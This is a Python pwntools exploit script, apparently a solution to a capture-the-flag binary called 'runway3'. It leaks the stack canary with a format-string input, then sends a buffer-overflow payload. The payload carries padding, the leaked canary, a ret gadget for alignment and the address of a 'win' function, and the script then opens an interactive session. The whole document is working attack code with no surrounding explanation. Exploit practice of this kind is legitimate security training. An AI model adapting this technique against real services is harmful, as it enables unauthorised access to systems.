#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("runway3")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses

# Functions

io = start()

io.sendlineafter(b"Is it just me, or is there an echo in here?", b"%13$p")
io.recvline()
canary = io.recvline().strip() # we will get it in hex because using $p
canary = int(canary, 16)
log.info("Canary: %s" % hex(canary))

rop = ROP(elf)
ret = rop.find_gadget(['ret']).address # need ret gadget for stack alignment

offset = 0x28
payload = b"A"*offset
payload += p64(canary)
payload += b"B"*8 # RBP
payload += p64(ret)
payload += p64(elf.sym.win)

io.sendline(payload)


io.interactive()
